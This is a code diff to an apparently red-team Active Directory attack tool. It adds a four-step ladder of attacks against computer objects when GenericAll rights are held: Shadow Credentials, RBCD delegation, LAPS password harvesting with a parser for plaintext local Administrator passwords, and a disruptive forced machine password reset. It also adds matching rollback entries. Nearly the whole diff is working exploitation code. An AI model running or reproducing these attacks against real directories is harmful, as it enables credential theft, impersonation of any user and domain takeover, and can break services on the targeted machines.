@@ -49,6 +49,10 @@ class GenericAllHandler(BaseEdgeHandler):
 
     def __init__(self, config: PathStrikeConfig, credential_store: CredentialStore) -> None:
         super().__init__(config, credential_store)
+        # Tracks which fallback strategy actually succeeded for multi-strategy
+        # target types (currently Computer).  Consulted by get_rollback_action
+        # so the rollback entry matches what was done at runtime.
+        self._successful_strategy: str | None = None
 
     async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
         target_type = edge.target.label.lower()
@@ -119,18 +123,18 @@ class GenericAllHandler(BaseEdgeHandler):
                     return False, f"Failed to add {principal} to {target}: {result.get('error', 'unknown')}", []
                 return True, f"Added {principal} to group {target}", []
 
-            # ----- Computer target: RBCD attack -----
+            # ----- Computer target: Shadow Creds → RBCD → LAPS → PwReset -----
             case "computer":
                 if dry_run:
-                    return True, f"[DRY RUN] Would configure RBCD on {target}", []
-
-                # Use the current principal's machine account or the controlled user
-                machine_account = principal
-                self.logger.info("Setting RBCD on %s for %s", target, machine_account)
-                result = await bloody.set_rbcd(self.config, auth_args, target, machine_account)
-                if not result["success"]:
-                    return False, f"Failed to set RBCD on {target}: {result.get('error', 'unknown')}", []
-                return True, f"RBCD configured on {target} for {machine_account}", []
+                    return (
+                        True,
+                        f"[DRY RUN] Would try Shadow Creds → RBCD → LAPS → "
+                        f"password reset on computer {target}",
+                        [],
+                    )
+                return await self._exploit_computer_ladder(
+                    edge, target, principal, auth_args,
+                )
 
             # ----- Domain target: grant DCSync rights -----
             case "domain":
@@ -145,6 +149,195 @@ class GenericAllHandler(BaseEdgeHandler):
 
             case _:
                 return False, f"Unsupported target type: {edge.target.label}", []
+
+    async def _exploit_computer_ladder(
+        self,
+        edge: EdgeInfo,
+        target: str,
+        principal: str,
+        auth_args: list[str],
+    ) -> tuple[bool, str, list[Credential]]:
+        """Try Computer-target exploits in order, stopping at first success.
+
+        Order (least → most disruptive):
+            1. Shadow Credentials — AddKeyCredentialLink; PKINIT yields the
+               machine's NT hash.  Non-disruptive, chainable.
+            2. RBCD — msDS-AllowedToActOnBehalfOfOtherIdentity; S4U2Self /
+               S4U2Proxy impersonates any user on the target.
+            3. LAPS Read — returns ``ms-Mcs-AdmPwd`` / ``msLAPS-Password``
+               if the attacker has read rights on the attribute.  Harvests
+               the local Administrator password.
+            4. Force machine password reset — disruptive (service/user
+               logons on the machine may break until AD re-syncs).
+
+        Every attempted strategy is logged.  The successful strategy name
+        is stashed on ``self._successful_strategy`` so that
+        :meth:`get_rollback_action` can return a rollback entry that
+        matches what actually happened.
+        """
+        new_creds: list[Credential] = []
+        strategy_errors: list[str] = []
+
+        # -------- Strategy 1: Shadow Credentials on the computer ----------
+        self.logger.info(
+            "[Strategy 1/4] Shadow Credentials on computer %s", target,
+        )
+        result = await bloody.add_shadow_credentials(self.config, auth_args, target)
+        if result["success"]:
+            self._successful_strategy = "shadow_creds"
+            cert_path = result.get("output", "")
+            new_creds.append(
+                Credential(
+                    cred_type=CredentialType.certificate,
+                    value=cert_path,
+                    username=target,
+                    domain=self._get_domain(),
+                    obtained_from=f"Shadow creds on computer {target}",
+                )
+            )
+            return True, f"Shadow credential added to computer {target}", new_creds
+        err = result.get("error", "unknown")
+        strategy_errors.append(f"Shadow Creds: {err}")
+        self.logger.warning("Shadow Creds failed on %s: %s", target, err)
+
+        # -------- Strategy 2: RBCD -----------------------------------------
+        self.logger.info(
+            "[Strategy 2/4] RBCD configuration on %s (trustee=%s)",
+            target, principal,
+        )
+        result = await bloody.set_rbcd(self.config, auth_args, target, principal)
+        if result["success"]:
+            self._successful_strategy = "rbcd"
+            return (
+                True,
+                f"RBCD configured on {target} (S4U2Proxy via {principal} → any user)",
+                [],
+            )
+        err = result.get("error", "unknown")
+        strategy_errors.append(f"RBCD: {err}")
+        self.logger.warning("RBCD failed on %s: %s", target, err)
+
+        # -------- Strategy 3: LAPS Read ------------------------------------
+        self.logger.info("[Strategy 3/4] LAPS password read on %s", target)
+        result = await bloody.read_laps(self.config, auth_args, target)
+        if result["success"]:
+            laps_pwd = self._extract_laps_password(result)
+            if laps_pwd:
+                self._successful_strategy = "laps"
+                new_creds.append(
+                    Credential(
+                        cred_type=CredentialType.password,
+                        value=laps_pwd,
+                        username="Administrator",
+                        domain=target,  # local scope, not AD domain
+                        obtained_from=f"LAPS read on {target}",
+                    )
+                )
+                return (
+                    True,
+                    f"LAPS password read from {target} (local Administrator)",
+                    new_creds,
+                )
+            strategy_errors.append("LAPS: attribute empty or encrypted")
+            self.logger.warning(
+                "LAPS read succeeded but no plaintext password in output on %s "
+                "(attribute may be empty, encrypted, or not set)", target,
+            )
+        else:
+            err = result.get("error", "unknown")
+            strategy_errors.append(f"LAPS: {err}")
+            self.logger.warning("LAPS read failed on %s: %s", target, err)
+
+        # -------- Strategy 4: Force machine password reset -----------------
+        self.logger.info(
+            "[Strategy 4/4] Force machine password reset on %s (disruptive)",
+            target,
+        )
+        new_pass = _generate_password()
+        sam = target if target.endswith("$") else f"{target}$"
+        result = await bloody.set_password(self.config, auth_args, sam, new_pass)
+        if result["success"]:
+            self._successful_strategy = "password_reset"
+            new_creds.append(
+                Credential(
+                    cred_type=CredentialType.password,
+                    value=new_pass,
+                    username=sam,
+                    domain=self._get_domain(),
+                    obtained_from=f"Machine password reset on {target}",
+                )
+            )
+            return True, f"Machine password reset for {target}", new_creds
+        err = result.get("error", "unknown")
+        strategy_errors.append(f"Password Reset: {err}")
+        self.logger.warning("Machine password reset failed on %s: %s", target, err)
+
+        # -------- All strategies exhausted ---------------------------------
+        combined = "; ".join(strategy_errors)
+        return (
+            False,
+            f"All 4 computer-target strategies failed on {target}: {combined}",
+            [],
+        )
+
+    def _extract_laps_password(self, result: dict) -> str | None:
+        """Extract the plaintext LAPS password from a bloodyAD read result.
+
+        Handles both legacy LAPS (``ms-Mcs-AdmPwd``) and modern Windows
+        LAPS (``msLAPS-Password`` JSON blob: ``{"n": "Administrator",
+        "p": "<plaintext>"}``).  Returns ``None`` if no plaintext is
+        present — e.g. for Windows LAPS with encrypted passwords (DPAPI-NG),
+        which this tool does not decrypt.
+        """
+        parsed = result.get("parsed")
+        output = result.get("output", "") or ""
+
+        # Legacy LAPS — attribute value is the plaintext password directly.
+        if isinstance(parsed, dict):
+            for k, v in parsed.items():
+                if not isinstance(v, str):
+                    continue
+                key_lower = k.lower()
+                if key_lower in {"ms-mcs-admpwd"}:
+                    return v.strip() or None
+                if key_lower in {"mslaps-password"}:
+                    # Windows LAPS: value is either JSON string or raw password.
+                    stripped = v.strip()
+                    if stripped.startswith("{"):
+                        try:
+                            import json as _json
+                            blob = _json.loads(stripped)
+                            pwd = blob.get("p")
+                            if isinstance(pwd, str) and pwd:
+                                return pwd
+                        except (ValueError, TypeError):
+                            pass
+                    elif stripped:
+                        return stripped
+
+        # Fallback: scan text output for recognisable keys.
+        for line in output.splitlines():
+            if ":" not in line:
+                continue
+            key, _, val = line.partition(":")
+            key_lower = key.strip().lower()
+            val = val.strip()
+            if key_lower == "ms-mcs-admpwd" and val:
+                return val
+            if key_lower == "mslaps-password" and val:
+                if val.startswith("{"):
+                    try:
+                        import json as _json
+                        blob = _json.loads(val)
+                        pwd = blob.get("p")
+                        if isinstance(pwd, str) and pwd:
+                            return pwd
+                    except (ValueError, TypeError):
+                        continue
+                else:
+                    return val
+
+        return None
 
     def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
         principal = self._resolve_principal(edge)
@@ -169,10 +362,49 @@ class GenericAllHandler(BaseEdgeHandler):
                     reversible=True,
                 )
             case "computer":
+                # Rollback depends on which strategy actually succeeded at
+                # runtime (tracked on self._successful_strategy by the ladder).
+                strategy = self._successful_strategy
+                if strategy == "shadow_creds":
+                    return RollbackAction(
+                        step_index=0,
+                        action_type="remove_key_credential",
+                        description=f"Remove shadow credential from computer {target}",
+                        command=f"bloodyAD remove shadowCredentials {target}",
+                        reversible=True,
+                    )
+                if strategy == "rbcd":
+                    return RollbackAction(
+                        step_index=0,
+                        action_type="remove_rbcd",
+                        description=f"Remove RBCD delegation on {target}",
+                        command=f"bloodyAD remove rbcd {target} {principal}",
+                        reversible=True,
+                    )
+                if strategy == "laps":
+                    # LAPS read is pure enumeration — nothing was written.
+                    return None
+                if strategy == "password_reset":
+                    # Machine password reset is not reliably reversible
+                    # without the prior hash.  Record an informational entry.
+                    sam = target if target.endswith("$") else f"{target}$"
+                    return RollbackAction(
+                        step_index=0,
+                        action_type="machine_password_reset_manual",
+                        description=(
+                            f"Machine password reset on {sam} — cannot be "
+                            f"auto-reverted.  AD will eventually replace it "
+                            f"via the secure channel, but service logons may "
+                            f"break until then."
+                        ),
+                        command=f"# manual cleanup required for {sam}",
+                        reversible=False,
+                    )
+                # Fallback (pre-execution planning or all strategies failed)
                 return RollbackAction(
                     step_index=0,
                     action_type="remove_rbcd",
-                    description=f"Remove RBCD delegation on {target}",
+                    description=f"Remove RBCD delegation on {target} (if set)",
                     command=f"bloodyAD remove rbcd {target} {principal}",
                     reversible=True,
                 )
